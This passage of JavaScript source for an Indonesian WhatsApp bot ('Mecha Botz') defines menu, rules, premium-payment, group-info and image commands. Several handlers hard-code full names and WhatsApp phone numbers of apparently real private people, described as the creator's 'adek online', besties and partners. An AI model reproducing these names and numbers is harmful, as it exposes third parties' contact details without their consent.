• *Tag :* @${sender.split('@')[0]}
• *Nomor :* +${sender.split("@")[0]}
• *Waktu Verifikasi :* ${timesNow}
• *Total Register :* ${_registered.length}
• *Total Pengguna :* ${pendaftar.length}
Jangan Lupa Donasi Bro!

Click the menu button below to view Menu`
let verif = await getBuffer(ppimg)
//let verif = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(namaUser)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${bgbot}`)
let vefy = await surya.prepareMessage(from, verif, location, {thumbnail: verif})
const buttons = [
{buttonId: 'help', buttonText: {displayText: 'Menu'}, type: 1},
]

const buttonMessage = {
//imageMessage: vefy.message.imageMessage,
locationMessage: vefy.message.locationMessage,
contentText: `${hasil}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
}

switch(commands){
case 'faqbot':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let faq = await surya.prepareMessage(from, FAQ, image)
const buttons = [
{buttonId: 'verify', buttonText: {displayText: 'Paham'}, type: 1},
{buttonId: '210505', buttonText: {displayText: 'Tidak paham'}, type: 1},

]
const buttonMessage = {
imageMessage: faq.message.imageMessage,
contentText: `Halo @${sender.split('@')[0]} salam sejahtera 😊
Jika Menggunakan Bot Jangan lupa donasi jika ada rezeki dan ikuti rules bot yah kak

*Rules Mecha Botz :*

- Jangan telpon bot (malu aku tuh >//<)
- Jangan spam bot (capek aku kak (+_+)
- Jangan perjual belikan bot ini (ihh kamu jangan gitu yah)
- Jangan hina bot (kak jangan hina atuh nanti owner sakit hati (-_-)
- Jangan lupa sholat (jika kamu muslim (user: bot kamu sholat? bot: aku tidak sholat karena aku bukan manusia, tapi owner aku orang muslim dan dia sholat)
- Dan terakhir jangan lupa buat mantan bahagia (user: ehh kok bahagia in mantan? bot: ya ndak tau surya yang bilang gitu)

NOTE
Bot ini memiliki semacam limit atau user premium, semuanya tidak gratis ya kak
Bot ini masih tahap awal pengembangan jika ada error silahkan lapor ke creator saya Surya
Bot ini bisa anda gunakan gratis atau bisa add ke group kamu (tidak selamanya yah kak)
rules bot bisa berubah kapan saja tergantung mod creator
silahkan menggunakan Mecha Botz and happy enjoy

Penutup:
Jika ingin berdonasi/lapor bug/request fitur silahkan hubungi Creator and Be happy


*_Apakah kamu sudah paham tentang FAQ Mecha Botz ?_*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
break
}

switch(commands) {
case 'id16':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
textImg(`_Menampilkan Fitur Bot, mohon tunggu sebentar...._`)
let ststs = await surya.getStatus(`${sender.split('@')[0]}@c.us`)
let stst = ststs.status == 401 ? 'Bio di private': 'Bio di private'
let youra = await surya.prepareMessage(from, suryaImg, image, {thumbnail: suryaImg})
let youLevel = level.getLevelingLevel(sender, _level)
let youExp = level.getLevelingXp(sender, _level)
let youRequiredExp = 10 * Math.pow(youLevel, 2) + 50 * youLevel + 100
let youRank = level.getUserRank(sender, _level)
let gambur = `https://i.ibb.co/pWkvQxf/133ae7a1cbfc.jpg`
let gambar = await getBuffer(gambur)
let kntol = await surya.prepareMessage(from, gambar, image, {thumbnail: suryaImg})
let HelpOri = `_*${Ucapan}*_

*❏ About Mecha*
├⟢ _*Name : © ᴍᴇᴄʜᴀ ʙᴏᴛᴢ VIP*_
├⟢ _*Type : Nodejs*_
├⟢ _*Platform : Android*_
├⟢ _*Baterai : ${baterai.baterai}% - ${baterai.cas === 'true' ? 'Charged' : 'Not charged'}*_
├⟢ _*Device : Xiaomi*_
├⟢ _*Creator bot : @${Suryaa.split('@')[0]}*_
├⟢ _*Waktu : ${timesNow}*_
├⟢ _*Runtime : ${runtime(process.uptime())}*_
├⟢ _*Total hit : ${hit_today.length}*_
├⟢ _*Total User : ${pendaftar.length}*_
├⟢ _*Total Register : ${_registered.length}*_
└⟢ _*Versi : Mecha Botz Update Versi 19*_

*❏ Your Info*
├⟢ _*Name : ${pushname}*_
├⟢ _*Number : @${sender.split('@')[0]}*_
├⟢ _*Bio : ${stst}*_
├⟢ _*Status : ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Gratisan'}*_
├⟢ _*Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}*_
├⟢ _*Limit game : ${cekGLimit(sender, gcount, glimit)}/${gcount}*_
├⟢ _*Balance : $${getBalance(sender, balance)}*_
├⟢ _*Expired prem : ${isOwner ? 'Permanen' : isPremium ? expired : 'Not Premium'}*_
├⟢ _*EXP : ${youExp}/${youRequiredExp}*_
├⟢ _*Level : ${youLevel}*_
├⟢ _*Rank : ${rank}*_
├⟢ _*Top rank : ${youRank}*_
└⟢ _*Group Creator : ${Mechagc}*_`
const buttons = [
{buttonId: 'rules', buttonText: {displayText: 'Syarat dan Ketentuan'}, type: 1},
{buttonId: 'id17', buttonText: {displayText: 'Owner Bot'}, type: 1}]
const buttonMessage = {
imageMessage: kntol.message.imageMessage,
contentText: HelpOri,
footerText: `${MENU}

*Baca Rules Dan Faq Dulu Sebelum Menggunakan Mecha Botz*

© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}
surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000,
isForwarded: true,
sendEphemeral: true,
"externalAdReply": {
"title": `Hallo ${pushname}` ,
"body": `${Ucapan}`,
"mediaType": "2",
"thumbnailUrl": "https://i.ibb.co/CMmF2qD/a704bc3b6536.jpg",
"mediaUrl": "https://youtu.be/3jYbJq2JMiM",
"thumbnail": fs.readFileSync('./sticker/mecha.jpeg'),
"sourceUrl": "https://www.instagram.com/surya_skylark05",
},mentionedJid:[Suryaa, sender, '0@s.whatsapp.net']}, quoted : ftroli})
break
}
switch(commands) {
case 'rules':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let rulesfaq = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Rules`)
let mhan = await surya.prepareMessage(from, rulesfaq, location, {thumbnail: rulesfaq})
const but = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const locMessage = {
locationMessage: mhan.message.locationMessage,
contentText: `
${Ucapan} @${sender.split('@')[0]}

┏━❬ *Peraturan Mecha Botz* ❭
┃
┃◪ _*Peringatan :*_
┃• Telpon/VC = Blok Otomatis!
┃ 
┃◪ _*Banned + Denda 5K*_
┃• Spam Chat.
┃• Spam Call.
┃• Spam SMS.
┃• Menghina Mecha Botz.
┃
┃◪ _*Banned Sementara*_
┃• Laporan Request Fitur Palsu/Main-Main.
┃• Laporan Bug Pada Fitur Palsu/Main-Main.
┃• Sering Berkata Y.
┃• Bersikap Dingin.
┃• Rasis/SARA.
┃• Memainkan Fitur Antidelete
┃
┃◪ _*Banned + Blok permanen*_
┃• Merusak Nama Baik Mecha Botz.
┃• Meniru/Menyalin Teks² Pesan Pada Mecha Botz Tanpa Izin Surya.
┃• Spam Menu Gak Jelas.
┃• Menghina Creator Mecha Botz.
┃• Menghina Agama Islam.
┃• Berkata Kasar Kepada Bot.
┃
┃◪ _*Faq*_
┃• Jangan hina bot (kak jangan hina atuh nanti owner sakit hati)
┃• Jangan lupa sholat! jika kamu muslim (user: bot kamu sholat? bot: aku tidak sholat karena aku bukan manusia, tapi owner aku muslim dan dia sholat)
┃• Dan terakhir jangan lupa buat mantan bahagia (user: ehh kok bahagia in mantan? bot: ya ndak tau surya yang bilang gitu)
┃
┃◪ _*Syarat & Ketentuan*_
┃• Bot *hanya menyimpan nomor anda* di dalam database sebagai nomor user
┃• Bot *tidak pernah meminta informasi pribadi* anda seperti alamat rumah, asal daerah dan lain lain.
┃• Dilarang melakukan spam terhadap bot
┃• Dilarang menelpon bot
┃• Harap menggunakan fitur bot dengan bijak
┃• Bot tidak menyimpan foto, video, atau media apapun yang anda kirimkan
┃• Bot *tidak bertanggung jawab atas fitur apapun yang anda gunakan*
┃• Apabila menemukan bug, error, ataupun request fitur harap hubungi developer
┃• Bot *berhak untuk memblokir* atau melakukan ban terhadap user dengan alasan maupun tanpa alasan
┃• Jika tidak membayar denda, Maka Mecha Botz akan membanned permanen user!
┃• Perlakukan bot secara baik, *creator* akan bertindak tegas apabila user *melanggar rules!*
┃• Bot ini terdapat anti-spam yang berupa cooldown command selama *5 detik* setiap kali pemakaian!
┃• Bot ini memiliki semacam limit atau user premium, tidak gratis ya kak!
┃• Bot ini masih tahap pengembangan, jika ada yang error silahkan hubungi creator saya @${Suryaa.split('@')[0]}
┃• Bot ini bisa anda gunakan gratis atau bisa add ke group kamu (tidak selamanya ya kak)
┃• Rules bot bisa berubah kapan saja tergantung mod developer
┗━━━━━━━━━━━━━━━━

┏━━━━❬ *Denda* ❭━━━━┓
┣➥ *Pulsa :* 0895415497664
┣➥ *Dana :* 0895415497664
┗━━━━━━━━━━━━━━━━

Silahkan Menggunakan Mecha Botz And Happy Enjoy 😊`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: but,
headerType: 6
}
surya.sendMessage(from, locMessage, MessageType.buttonsMessage, {
"contextInfo": {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']},
quoted: ftroli})
break
}

switch(butt) {
case 'id17':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
surya.sendContact(from, Suryaa.split("@")[0], 'ᴹᴿ᭄𝑺𝒖𝒓𝒚𝒂ㄙ×፝֟͜×', msg)
setTimeout( () => {
mentions(`Hai Kak @${sender.split('@')[0]}, Nih kontak owner aku
Jangan lupa di save ya~`, [sender], true)
}, 1500)
break
}
switch(commands){
case 'simpelmenu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
textImg(`_Menampilkan Simpel Menu, mohon tunggu sebentar...._`)
let youra = await surya.prepareMessage(from, suryaImg, image, {thumbnail: suryaImg})
let vipcek = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
let cekprem = `${vipcek.days} day ${vipcek.hours} hour ${vipcek.minutes} minute ${vipcek.seconds} second`
const buttons = [
{buttonId: 'adeksurya', buttonText: {displayText: 'Adek Surya'}, type: 1},
{buttonId: 'mypartner', buttonText: {displayText: 'Partner Surya'}, type: 1},
]

const buttonMessage = {
imageMessage: youra.message.imageMessage,
contentText: `${Ucapan}
${sholat}

╭━━❬ *INFORMASI USER* ❭
├≽ *Nama :* ${pushname}
├≽ *Tag :* @${sender.split('@')[0]}
├≽ *Status* : ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Gratisan'}
├≽ *Limit :* ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}
├≽ *Limit Game :* ${cekGLimit(sender, gcount, glimit)}/${gcount}
├≽ *Balance :* $${getBalance(sender, balance)}
├≽ *Expired Prem :* ${isOwner ? 'Permanen' : isPremium ? expired : 'Not Premium'}
└──────────────

╭━━❬ *SIMPEL MENU* ❭
│⬡ ${prefix}infomenu
│⬡ ${prefix}premiummenu
│⬡ ${prefix}ownermenu
│⬡ ${prefix}groupmenu
│⬡ ${prefix}securitymenu
│⬡ ${prefix}gamemenu
│⬡ ${prefix}makermenu
│⬡ ${prefix}sertimenu
│⬡ ${prefix}islammenu
│⬡ ${prefix}quotesmenu
│⬡ ${prefix}mememenu
│⬡ ${prefix}randommenu
│⬡ ${prefix}baileysmenu
│⬡ ${prefix}toolsmenu
│⬡ ${prefix}stalkermenu
│⬡ ${prefix}animemenu
│⬡ ${prefix}nsfwmenu
│⬡ ${prefix}fiturbaru
└───────────────`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000,
isForwarded: true,
sendEphemeral: true,
"externalAdReply": {
"title": `Hallo ${pushname}` ,
"body": `${Ucapan}`,
"mediaType": "2",
"thumbnailUrl": "https://i.ibb.co/CMmF2qD/a704bc3b6536.jpg",
"mediaUrl": "https://youtu.be/3jYbJq2JMiM",
"thumbnail": fs.readFileSync('./sticker/mecha.jpeg'),
"sourceUrl": "https://www.instagram.com/surya_skylark05",
},mentionedJid:[Suryaa, sender, '0@s.whatsapp.net']}, quoted : ftroli})
break
}
/*if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 

let Vinna = `6282314460324@s.whatsapp.net`
let Shayna = `6285724775116@s.whatsapp.net`
let Amanda = `6281227993047@s.whatsapp.net`
let Aisyah = `6289637283487@s.whatsapp.net`
let Dinda = `6281999505999@s.whatsapp.net`
let Zahra = `62895343304106@s.whatsapp.net`
let Clara = `628994120903@s.whatsapp.net`
const buttons = [{buttonId: 'verify', buttonText: {displayText: 'Siap bro!'}, type: 1}]
const buttonMessage = {
contentText: `Nih adek onlinenya Surya *Jangan di pacarin ya!*

㋛ Vinna Aulia Lestari
*• @${Vinna.split('@')[0]}*

㋛ Shayna Alviana
*• @${Shayna.split('@')[0]}*

㋛ Amanda Putri Handayani
*• @${Amanda.split('@')[0]}*

㋛ Adinda Oktavia
*• @${Dinda.split('@')[0]}*

㋛ Irma Bella Rahayu
*• @${Kizora.split('@')[0]}*

㋛ Zahra Dzakira
*• @${Zahra.split('@')[0]}*

㋛ Clarissa Satu Qomariyah
*• @${Clara.split('@')[0]}*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
"contextInfo": {mentionedJid: [Suryaa, Shayna, Vinna, Amanda, Kizora, Zahra, Dinda, Clara, sender]}, quoted: msg})
break
}*/
switch(commands){
case 'adeksurya': case 'adeks':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 

let Vinna = `6282314460324@s.whatsapp.net`
let Shayna = `6285724775116@s.whatsapp.net`
let Amanda = `6281227993047@s.whatsapp.net`
let Aisyah = `6289637283487@s.whatsapp.net`
let Dinda = `6281999505999@s.whatsapp.net`
let Zahra = `62895343304106@s.whatsapp.net`
let Clara = `628994120903@s.whatsapp.net`
const buttons = [{buttonId: 'verify', buttonText: {displayText: 'Siap stah'}, type: 1}]
const buttonMessage = {
contentText: `Nih adek onlinenya Surya *Jangan di pacarin ya!*

㋛ Vinna Aulia Lestari
*• @${Vinna.split('@')[0]}*

㋛ Clarissa Satu Qomariyah
*• @${Clara.split('@')[0]}*`,
footerText: `_*Akan terhapus otomatis dari daftar adek surya jika tidak pernah perhatian!*_`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
"contextInfo": {mentionedJid: [Suryaa, Shayna, Vinna, Amanda, Kizora, Zahra, Dinda, Clara, sender]}, quoted: msg})
break
}
switch(commands){
case 'bestiesurya': case 'besties': case 'mybestie':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 

let Vinna = `6282314460324@s.whatsapp.net`
let Nurul = `6288296429263@s.whatsapp.net`
let Hilya = `6288232583616@s.whatsapp.net`
let Dinda = `6281999505999@s.whatsapp.net`
const buttons = [
{buttonId: 'verify', buttonText: {displayText: 'Iya stah'}, type: 1},
]
const buttonMessage = {
contentText: `Nih Bestie onlinenya Surya *Jangan dipacarin ya!*

㋛ Hilyatul Zam Zam
*• @${Hilya.split('@')[0]}*

㋛ Nurul Hidayati
*• @${Nurul.split('@')[0]}*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
 "contextInfo": {
mentionedJid: [Suryaa, Nurul, Hilya, sender]},
quoted: msg})
break
}

switch(commands){
case 'mypartner':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 

let Kizora = `6282198938463@s.whatsapp.net`
let Farid = `6281231951590@s.whatsapp.net`
let Reyzen = `6283148375193@s.whatsapp.net`
const buttons = [
{buttonId: 'verify', buttonText: {displayText: 'Siap bro!'}, type: 1},
]
const buttonMessage = {
contentText: `Nih partnernya Surya
Jangan di kasarin ya!

㋛Kizora
Wa ➪ @${Kizora.split('@')[0]}

㋛Farid
Wa ➪ @${Farid.split('@')[0]}

㋛Reyzenn
Wa ➪ @${Reyzen.split('@')[0]}

㋛Doi Gak Ada Akhlak
Wa ➪ @${Mine.split('@')[0]}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
 "contextInfo": {
mentionedJid: [Suryaa, Kizora, Reyzen, Farid, Mine, sender]},
quoted: msg})
break
}
switch(commands){
case 'buyprem': case 'buypremium': case 'belipremium':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 

const buttons = [
{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Mecha Botz'}, type: 1},
{buttonId: 'creatormecha', buttonText: {displayText: 'Creator Bot'}, type: 1}]

const buttonMessage = {
contentText: `${Ucapan} @${sender.split('@')[0]}

*List Daftar Harga Premium :*
• 1K/Hari
• 5K/Minggu
• 10K/Bulan

_*Pembayaran Bisa Melalui :*_
• PULSA : 0895415497664
• DANA : 0895415497664`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./media/Surya.jpg'),
 "contextInfo": {
mentionedJid: [Suryaa, sender]},
quoted: ftroli})
break
}

switch(commands){
case 'pulsaa':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 

const buttons = [
{buttonId: 'buyprem', buttonText: {displayText: '🔙BACK'}, type: 1},
]
const buttonMessage = {
contentText: `${Ucapan} @${sender.split('@')[0]}
${sholat}


PULSA : 0895415497664

Hubungi
wa.me/62895415497664`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./media/Surya.jpg'),
 "contextInfo": {
mentionedJid: [Suryaa, sender]},
quoted: ftroli})
break
}
switch(butt) {
case 'danaa':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 

const buttons = [
{buttonId: 'buyprem', buttonText: {displayText: '🔙BACK'}, type: 1},
]

const buttonMessage = {
contentText: `${Ucapan} @${sender.split('@')[0]}

${sholat}


DANA : 0895415497664

Hubungi
wa.me/62895415497664`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./media/Surya.jpg'),
 "contextInfo": {
mentionedJid: [Suryaa, sender]},
quoted: ftroli})
break
}

switch(commands){
case 'info': case 'infogc': case 'infogrup':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
try {
var pic = await surya.getProfilePicture(from)
} catch {
var pic = 'https://i.ibb.co/9cNvmZh/Onichan.jpg'
}
let cumi = await surya.prepareMessage(from, await getBuffer (pic), location, {thumbnail: await getBuffer (pic)})

const buttons = [
{buttonId: 'verify', buttonText: {displayText: 'Oke'}, type: 1},
//{buttonId: 'no', buttonText: {displayText: 'NO'}, type: 1},

]
const buttonMessage = {
locationMessage: cumi.message.locationMessage,
contentText: `
*Name :* ${groupName}
*ID Grup :* ${from}
*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
*Creator Grup :* @${groupMetadata.owner.split('@')[0]}
*Jumlah Admin :* ${groupAdmins.length}
*Jumlah Peserta :* ${groupMembers.length}
*Deskripsi :* 
${groupMetadata.desc}

𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗚𝗥𝗢𝗨𝗣❗
Welcome : ${isWelcome ? 'ᴏɴ' : 'ᴏғғ'}
Left : ${isLeft ? 'ᴏɴ' : 'ᴏғғ'}
Leveling : ${isLevelingOn ? 'ᴏɴ ' : 'ᴏғғ'}
Event : ${isMiningOn ? 'ᴏɴ ' : 'ᴏғғ'}
Nsfw : ${isNsfw ? 'ᴏɴ ' : 'ᴏғғ'}
Simih : ${isSimih ? 'ᴏɴ ' : 'ᴏғғ'}
Pengingat sholat : ${isSholat ? 'ᴏɴ ' : 'ᴏғғ'}

Anti link grup : ${isAntiLinkGrup ? 'ᴏɴ ' : 'ᴏғғ'}
Anti link youtube : ${isAntiLinkYoutube ? 'ᴏɴ ' : 'ᴏғғ'}
Anti link facebook : ${isAntiLinkFacebook ? 'ᴏɴ ' : 'ᴏғғ'}
Anti link tiktok : ${isAntiLinkTiktok ? 'ᴏɴ ' : 'ᴏғғ'}
Anti link instagram : ${isAntiLinkInstagram ? 'ᴏɴ ' : 'ᴏғғ'}
Anti link telegram : ${isAntiLinktelegram ? 'ᴏɴ ' : 'ᴏғғ'}
Anti link wa : ${isAntiWame ? 'ᴏɴ ' : 'ᴏғғ'}
Anti semua link : ${isAntiLink ? 'ᴏɴ ' : 'ᴏғғ'}

Auto sticker : ${isAutoSticker ? 'ᴏɴ ' : 'ᴏғғ'}
Auto image : ${isAutoImage ? 'ᴏɴ ' : 'ᴏғғ'}
Auto video : ${isAutoVideo ? 'ᴏɴ ' : 'ᴏғғ'}
Auto colong : ${isAutoColong ? 'ᴏɴ ' : 'ᴏғғ'}
Auto join : ${isAutoJoin ? 'ᴏɴ ' : 'ᴏғғ'}

Anti tag : ${isAntiTag ? 'ᴏɴ ' : 'ᴏғғ'}
Anti bule : ${isAntiBule ? 'ᴏɴ ' : 'ᴏғғ'}
Anti view once : ${isAntiVO ? 'ᴏɴ ' : 'ᴏғғ'}
Anti delete : ${isAntiHapus ? 'ᴏɴ ' : 'ᴏғғ'}
Anti badword : ${isBadword ? 'ᴏɴ ' : 'ᴏғғ'}
Anti wibu : ${isLelah ? 'ᴏɴ ' : 'ᴏғғ'}
Anti tag surya : ${isAntiTagSurya ? 'ᴏɴ ' : 'ᴏғғ'}
Anti virtex : ${isAntiVirtex ? 'ᴏɴ ' : 'ᴏғғ'}`,
footerText: `Info grup dan keamanan grup mecha botz
© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, '0@s.whatsapp.net', groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}, quoted: msg})
break
}
switch(butt) {
case 'kickme':
if (isMuted) return
if (isBan) return 
if (!isBotGroupAdmins) return reply(`*Kamu beruntung karena bot bukan admin*`)
reply(`_Terimakasih atas jawaban anda_`)
surya.groupRemove(from, [sender])
break
}

switch(commands){
case 'cosplay':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
limitAdd(sender, limit)
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/cosplay.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let mybel = await getBuffer(wipi)
let youra = await surya.prepareMessage(from, mybel, image)


const buttons = [
{buttonId: 'cosplay', buttonText: {displayText: '➡️ Next'}, type: 1},
{buttonId: 'creator', buttonText: {displayText: 'Creator Bot'}, type: 1},
]
const buttonMessage = {
imageMessage: youra.message.imageMessage,
contentText: `Klik Next untuk ke gambar selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break
}
switch(commands){
case 'milf':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
limitAdd(sender, limit)
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/milf.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let mybel = await getBuffer(wipi)
let youra = await surya.prepareMessage(from, mybel, image)


const buttons = [
{buttonId: 'milf', buttonText: {displayText: '➡️ Next'}, type: 1},
{buttonId: 'creator', buttonText: {displayText: 'Creator Bot'}, type: 1},
]
const buttonMessage = {
imageMessage: youra.message.imageMessage,
contentText: `Klik Next untuk ke gambar selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break
}

switch(commands){
case 'husbu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
limitAdd(sender, limit)
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/husbu.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let mybel = await getBuffer(wipi)
let youra = await surya.prepareMessage(from, mybel, image)


const buttons = [
{buttonId: 'husbu', buttonText: {displayText: '➡️ Next'}, type: 1},
{buttonId: 'creator', buttonText: {displayText: 'Creator Bot'}, type: 1},
]
const buttonMessage = {
imageMessage: youra.message.imageMessage,
